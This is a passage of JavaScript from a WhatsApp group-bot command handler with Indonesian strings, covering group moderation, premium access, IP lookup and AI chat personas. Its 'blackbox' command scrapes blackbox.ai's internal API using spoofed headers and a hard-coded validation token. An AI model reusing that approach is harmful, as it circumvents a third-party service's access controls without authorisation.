        text: `Image ke - ${i++}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: text
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: 'Hasil.',
        hasMediaAttachment: true,
        imageMessage: await createImage(pus)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: `{"display_text":"url","Klik disini":"${pus}","merchant_url":"${pus}"}`
          }
        ]
      })
    });
  }

  const msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hai\nDibawah ini Adalah hasil dari Pencarian Kamu'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.namaowner
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await DanadyaksaDev.relayMessage(m.chat, msg.message, {
    messageId: msg.key.id
  });
  
}
uselimit(1)
break      

case "open": {
if (!isGroup) return m.reply(msg.ingroup)
if (!isBotAdmins) return m.reply(msg.adminbot)
if (!isAdmins && !Creator) return m.reply(msg.admin)
await DanadyaksaDev.groupSettingUpdate(m.chat, 'not_announcement')
m.reply("Successfully changed group settings to allow members to send messages by ©𝐃𝐚𝐧𝐚𝐝𝐲𝐚𝐤𝐬𝐚")
}
break

case "close": {
if (!isGroup) return m.reply(msg.ingroup)
if (!isBotAdmins) return m.reply(msg.adminbot)
if (!isAdmins && !Creator) return m.reply(msg.admin)
await DanadyaksaDev.groupSettingUpdate(m.chat, 'announcement')
m.reply("Successfully changed group settings to allow only admins to send messages by ©𝐃𝐚𝐧𝐚𝐝𝐲𝐚𝐤𝐬𝐚")
}
break

case 'culik': {
if (!m.isGroup) return reply(msg.ingroup)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await DanadyaksaDev.groupParticipantsUpdate(m.chat, [users], 'add')
await reply(`Done`)
}
break

case 'sulap': {
if (!m.isGroup) return reply(msg.ingroup)
if (!isAdmins && !Creator) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await DanadyaksaDev.groupParticipantsUpdate(m.chat, [users], 'remove')
await reply(`Out Deck🤪`)
}
break


case 'promote': {
if (!m.isGroup) return reply(msg.ingroup)
if (!isAdmins && !Creator) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await DanadyaksaDev.groupParticipantsUpdate(m.chat, [users], 'promote')
await reply(`Done`)
}
break

case 'demote': {
if (!m.isGroup) return reply(msg.ingroup)
if (!isAdmins && !Creator) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await DanadyaksaDev.groupParticipantsUpdate(m.chat, [users], 'demote')
await reply(`Done`)
}
break

case 'addaccess':
                if (!Creator) return reply(msg.developer)
                if (args.length < 2)
                    return reply(`Use :\n*#addaccess* @tag time\n*#addaccess* number time\n\nExample : #addaccess @tag 30d`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium);
                    }
                    reply("Success")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
                    reply("Success")
                }
                break      
        
case 'dellaccess':
                if (!Creator) return reply(msg.developer)
                if (args.length < 1) return reply(`Use :\n*#dellaccess* @tag\n*#dellaccess* number`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
                        fs.writeFileSync("./start/lib/database/premium.json", JSON.stringify(premium));
                    }
                    reply("Delete success")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
                    fs.writeFileSync("./start/lib/database/premium.json", JSON.stringify(premium));
                    reply("Success")
                }
                break        
                
case 'tqto': 
const dndyksa = `❏*「 ㄊ THANKS ☇ TO 」*
 ▢ My God ( *Allah Swt* )
 ▢ My Parents ( *ORTU* )
 ▢ Danadyaksa ϟ FictX ( *Developer* )
 ▢ Fallz444Official ϟ Ghifran (*Best Friend*) 
 ▢ ruzx ( *support* )
 ▢ KyuRzy ( *Base* )
❏ *「 ALL TEAM DG = DARK ↯ ANGEL 」*`;

    await DanadyaksaDev.sendMessage(m.chat, {
        video: { url: 'https://pomf2.lain.la/f/gsdljewa.mp4' }, // Ganti dengan URL video Anda
        gifPlayback: true,
        caption: dndyksa,
        contextInfo: {
            externalAdReply: {
                title: '𝐃𝐚ͯ𝐧͢𝐚͢𝐝𝐲᷍𝐚𝐤͢𝐬͢𝐚𝐈𝐬ͯ𝐇𝐞𝐫𝐞',
                body: 'Creator : DanadyaksaDev ZcoderX',
                thumbnailUrl: 'https://pomf2.lain.la/f/asneyvzb.jpg',
                sourceUrl: 'https://linktr.ee/DanadyaksaDev',
                mediaType: 1,
                renderLargerThumbnail: false
            }
        }
    }, {
        quoted: fpay
    });

    const audioUrl = 'https://pomf2.lain.la/f/dgmbeac6.mp4'; // Ganti dengan URL audio Anda
    await DanadyaksaDev.sendMessage(m.chat, { 
        audio: { url: audioUrl }, 
        mimetype: 'audio/mpeg', 
        ptt: true 
    }, { quoted: fpay }); 

    break;                                                                                  
case 'blackbox': {
  

//skrep dri *daffa*
  const { randomBytes, randomUUID } = require("crypto");
const api = 'https://www.blackbox.ai/api/chat';
const headers = {
  'User-Agent': 'Postify/1.0.0',
  'Accept': '*/*',
  'Referer': 'https://www.blackbox.ai',
  'Content-Type': 'application/json',
  'Origin': 'https://www.blackbox.ai',
  'DNT': '1',
  'Sec-GPC': '1',
  'Connection': 'keep-alive'
};

const request = (chat) => chat.map(({ files, ...rest }) => rest);
const rhex = (bytes) => randomBytes(bytes).toString('hex');
const uuid = () => randomUUID();

const config = (model) => ({
  trendingAgentMode: model[model] || {},
  userSelectedModel: defaultModel[model] || undefined,
  ...po[model]
});

const model = {
  blackbox: {},
  'llama-3.1-405b': { mode: true, id: 'llama-3.1-405b' },
  'llama-3.1-70b': { mode: true, id: 'llama-3.1-70b' },
  'gemini-1.5-flash': { mode: true, id: 'Gemini' }
};

const defaultModel = {
  'gpt-4o': 'gpt-4o',
  'claude-3.5-sonnet': 'claude-sonnet-3.5',
  'gemini-pro': 'gemini-pro'
};

const po = {
  'gpt-4o': { maxTokens: 4096 },
  'claude-3.5-sonnet': { maxTokens: 8192 },
  'gemini-pro': { maxTokens: 8192 }
};

const clear = (response) => {
  return response.replace(/\$~~~\$(.*?)\$~~~\$/g, '').trim();
};

const BlackBox = {
  async generate(chat, options, { max_retries = 5 } = {}) {
    const random_id = rhex(16);
    const random_user_id = uuid();
    chat = request(chat);

    const data = {
      messages: chat,
      id: random_id,
      userId: random_user_id,
      previewToken: null,
      codeModelMode: true,
      agentMode: {},
      ...config(options.model),
      isMicMode: false,
      isChromeExt: false,
      githubToken: null,
      webSearchMode: true,
      userSystemPrompt: null,
      mobileClient: false,
      maxTokens: 100000,
      playgroundTemperature: parseFloat(options.temperature) || 0.7,
      playgroundTopP: 0.9,
      validated: "69783381-2ce4-4dbd-ac78-35e9063feabc",
    };

    try {
      const response = await fetch(api, { method: 'POST', headers, body: JSON.stringify(data) });
      if (!response.ok) {
        throw new Error(`${await response.text()}`);
      }

      let tc = await response.text();
      let tr = clear(tc);


      if (tr.includes("$~~~$")) {
        data.mode = 'continue';
        if (!data.messages.some(msg => msg.content === tr)) {
          data.messages.push({ content: tr, role: 'assistant' });
        }

        const cor = await fetch(api, { method: 'POST', headers, body: JSON.stringify(data) });
        let ctc = await cor.text();
        tr += clear(ctc);
      }

      return tr; 

    } catch (err) {
      if (max_retries > 0) {
        console.error(err, "Mencoba ulang...");
        return this.generate(chat, options, { max_retries: max_retries - 1 });
      } else {
        throw err;
      }
    }
  }
};

  
  let { key } = await DanadyaksaDev.sendMessage(m.chat, { text: "..." });
  try {
    // Pastikan minimal ada teks
    if (!text) return m.reply("Masukkan pertanyaan untuk dijawab!\n\n*Contoh:* Siapa presiden Indonesia?");

    // Siapkan chat untuk dikirim ke BlackBox
    const chatMessages = [{ role: 'user', content: text }];
    const options = { model: 'blackbox', temperature: 0.7 }; // Sesuaikan model dan suhu jika perlu

    const responseMessage = await BlackBox.generate(chatMessages, options);

    await DanadyaksaDev.sendMessage(m.chat, {
      text: responseMessage,
      edit: key,
    });
  } catch (error) {
    await DanadyaksaDev.sendMessage(m.chat, {
      text: `Error: ${error.message}`,
      edit: key,
    });
  }
}
break          

case "ai": {
if (!users.registered) return reply(msg.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
if (!text) return m.reply("Masukan text!")
let prompt = "Nama kamu adalah Shyzu" // Isi prompt AI kamu disini
try {
  let { data } = await axios({
    "method": "GET",
    "url": "https://mannoffc-x.hf.space/ai/prompt",
    "params": {
      "prompt": prompt,
      "message": text
    }
  })
  m.reply(data.result);
} catch (e) {
  m.reply(e.message);
  console.log(e);
}
}
break;        

case 'eval':{
if (!Creator) return reply(msg.prem)
await DanadyaksaDev.sendMessage(m.chat, { react: { text: "♻️",key: m.key,}})    
if (!m.quoted) return reply(`*Reply pesan yang quotednya mau diambil*`);
        
        let penis = JSON.stringify({ [m.quoted.mtype]: m.quoted }, null, 2);
        let jeneng = `MessageData_${kripto.randomBytes(8).toString('hex')}.json`;

        await fs.writeFileSync(jeneng, penis);
        await reply(penis);
        await DanadyaksaDev.sendMessage(m.chat, { document: { url: `./${jeneng}` }, fileName: jeneng, mimetype: '*/*' }, { quoted: m });
        await fs.unlinkSync(jeneng);
}
await DanadyaksaDev.sendMessage(m.chat, { react: { text: "✈️",key: m.key,}})
break

case 'trackip':
{
if (!text) return m.reply(`*Example:* ${prefix + command} 112.90.150.204`);
try {
let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

const formatIPInfo = (info) => {
 return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
 - Image: ${info.flag?.img || 'N/A'}
 - Emoji: ${info.flag?.emoji || 'N/A'}
 - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
 - ASN: ${info.connection?.asn || 'N/A'}
 - Organization: ${info.connection?.org || 'N/A'}
 - ISP: ${info.connection?.isp || 'N/A'}
 - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
 - ID: ${info.timezone?.id || 'N/A'}
 - Abbreviation: ${info.timezone?.abbr || 'N/A'}
 - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
 - Offset: ${info.timezone?.offset || 'N/A'}
 - UTC: ${info.timezone?.utc || 'N/A'}
 - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
};
 
if (!res.success) throw new Error(`IP ${text} not found!`);
await DanadyaksaDev.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
await delay(2000);
m.reply(formatIPInfo(res)); 
} catch (e) { 
m.reply(`Error: Unable to retrieve data for IP ${text}`);
}
}
break
       
case 'autoai':
 if (!Creator) return reply(msg.prem)
 if (!users.registered) return reply(msg.daftar)
 if (args.length < 1) return 
 if (q == 'on') {
 global.db.data.chats[m.chat].ai = true
 m.reply('Sukses mengaktifkan chat ai')
 } else if (q == 'off') {
 global.db.data.chats[m.chat].ai = false
 m.reply('Sukes menonaktifkan chat ai')
 } else {
 //m.reply('Agak Laen')
 }
 break
        
default:
if (global.db.data.chats[m.chat].ai && body != undefined) {   
let chats = await luminai(body, `namamu adalah jizyy, ubah sifatmu seorang wanita yang pintar dan lucu, gunakan salah satu dari "(⁠人⁠ ⁠•͈⁠ᴗ⁠•͈⁠), (⁠◡⁠ ⁠ω⁠ ⁠◡⁠), (⁠ ⁠ꈍ⁠ᴗ⁠ꈍ⁠)" untuk menyampa user, dan gunakan salah satu ekspresi ini "(⁠ ⁠･ั⁠﹏⁠･ั⁠), (⁠｡⁠•́⁠︿⁠•̀⁠｡⁠), (⁠’⁠;⁠︵⁠;⁠’)" untuk sedih, dan gunakan salah satu ekspresi ini "(⁠ᗒ⁠ᗩ⁠ᗕ⁠), (⁠ ⁠≧⁠Д⁠≦⁠), .⁠·⁠’⁠¯⁠'⁠(⁠>⁠▂⁠<⁠)⁠'⁠¯⁠‘⁠·⁠." ketika menangis dan gunakan ${pushname} untuk menyebutkan nama user`, `${pushname}`)
//await sleep(5000)
let puqi = chats.result
m.reply(puqi)
}

if (!m.fromMe & !m.isGroup) {
let user = global.db.data.users[m?.sender];
const cooldown = 21600000;
if (new Date() - user.pc < cooldown) return; // every 6 hours
let caption = `Hi sis @${m?.sender.split('@')[0]} To use this chat bot, please type *.menu* to use its features (⁠ ⁠╹⁠▽⁠╹⁠ ⁠)`.trim();
DanadyaksaDev.sendMessage(m.chat,{ text: caption, mentions:[m.sender] },{ quoted:m })
user.pc = new Date() * 1;
}
        
}
} catch (err) {
console.log(require("util").format(err));
await DanadyaksaDev.sendMessage(`${global.owner}@s.whatsapp.net`, {text: `${util.format(err)}

Command From: ${m.sender.split("@")[0]}`}, {quoted: m})
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});